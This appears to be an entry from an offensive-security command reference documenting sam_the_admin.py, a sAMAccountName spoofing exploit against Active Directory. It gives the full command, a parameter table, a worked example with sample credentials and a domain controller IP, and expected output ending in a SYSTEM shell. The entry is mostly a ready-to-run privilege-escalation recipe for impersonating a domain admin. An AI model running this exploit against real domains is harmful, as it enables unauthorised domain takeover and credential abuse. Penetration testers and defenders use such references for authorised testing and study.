---
id: a8d23507-a4cf-4dc9-b7b3-b2486c611272
name: impersonate-domain-admin-with-sam-the-admin
type: command
executor: bash
data: 'python3 sam_the_admin.py "domain/user:password" -dc-ip 10.10.10.10 -shell'
output: null
created_at: '2023-04-06T03:56:03.186152+00:00'
updated_at: '2023-04-10T20:36:11.698743+00:00'
platforms:
  - Linux
tags:
  - privilege-escalation
  - impersonation
verified: true
validated: true
---

# impersonate-domain-admin-with-sam-the-admin

## Command

```bash
python3 sam_the_admin.py "domain/user:password" -dc-ip 10.10.10.10 -shell
```

## Description

Uses sam_the_admin.py to create a spoofed machine account matching a DC's samAccountName, obtain replication tickets, impersonate a domain admin, and spawn a shell.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| "domain/user:password" | Credentials in domain/user:pass format | Yes |
| -dc-ip | Domain controller IP | Yes |
| -shell | Launch interactive shell as impersonated user | Yes |

## Examples

### Basic Usage

```bash
python3 sam_the_admin.py "corp/lowuser:pass123" -dc-ip 192.168.1.100 -shell
```

## Expected Output

Script progress: "Adding Computer Account... Impersonating gaylene.dreddy... Launching shell... whoami: nt authority\system"

## Related

- [[procedures/Sam-Account-Name-Spoofing-for-User-Impersonation]]
- [[tools/sam-the-admin]]
